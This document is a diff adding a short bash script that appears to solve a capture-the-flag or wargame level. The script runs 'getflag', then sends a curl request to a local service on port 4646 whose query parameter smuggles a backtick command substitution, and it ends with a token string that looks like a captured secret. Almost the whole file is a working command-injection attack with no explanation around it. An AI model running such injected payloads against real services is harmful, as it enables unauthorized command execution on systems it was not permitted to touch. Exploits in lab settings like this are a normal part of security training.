@@ -1,0 +1,6 @@
+#!/bin/bash
+getflag > /tmp/file
+
+ curl localhost:4646?x='`/*/TEST`'
+
+token : g1qKMiRpXf53AWhDaU7FEkczr
